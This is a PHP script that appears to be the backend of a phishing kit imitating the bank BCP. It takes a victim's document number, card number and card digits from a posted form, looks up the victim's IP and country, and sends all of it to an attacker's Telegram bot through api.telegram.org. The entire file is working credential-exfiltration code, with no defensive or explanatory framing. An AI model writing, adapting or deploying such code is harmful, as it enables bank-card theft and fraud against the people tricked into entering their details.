<?php
session_start();
require_once("settings.php");
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo '{"success": false}';
}

$data = json_decode(file_get_contents("php://input"), true);

$website = "https://api.telegram.org/bot$token";

if (isset($data['usuario']) && isset($data['nocard'])) {
    $usuario = trim($data['usuario']);
    $cpass = trim($data['nocard']);
    $nodigit = trim($data['nodigit']);
    $_SESSION["usuario"] = $usuario; // ← Guardamos el usuario para el resto del flujo

    $ip = $_SERVER["REMOTE_ADDR"];
    $ch = curl_init("http://ip-api.com/json/$ip");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $ip_data = json_decode(curl_exec($ch), true);
    curl_close($ch);

    $country = $ip_data["country"] ?? "Desconocido";
    $ip = $ip_data["query"] ?? $ip;

    $msg = "BCP ingreso 📲\n📧 No Document: $usuario\n🔑 CARD: $cpass\n🔑 DIGITOS: $nodigit\n=============================\n📍 País: $country\n📍 IP: $ip\n==========================\n";
    $url = "$website/sendMessage?chat_id=$chat_id&parse_mode=HTML&text=" . urlencode($msg);
    file_get_contents($url);

    // Redirección
    echo '{"success": true}';
    exit;
}
?>
